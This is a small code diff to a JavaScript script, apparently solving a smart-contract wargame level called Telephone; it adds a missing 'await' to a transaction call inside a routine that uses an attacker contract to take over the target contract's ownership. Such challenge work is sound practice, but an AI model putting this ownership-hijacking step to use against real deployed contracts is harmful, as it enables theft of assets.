@@ -52,7 +52,7 @@ const attackTelephone = async () => {
     console.log(`Owner is: ${owner}`);
     console.log("Changing owner by using another contract...");
     const tx1 = await attack.changeOwner(telephoneAddress);
-    const tx1Receipt = tx1.wait();
+    const tx1Receipt = await tx1.wait();
     console.log(tx1Receipt);
     console.log("Checking Telephone owner again...");
     const newOwner = await contract.owner();
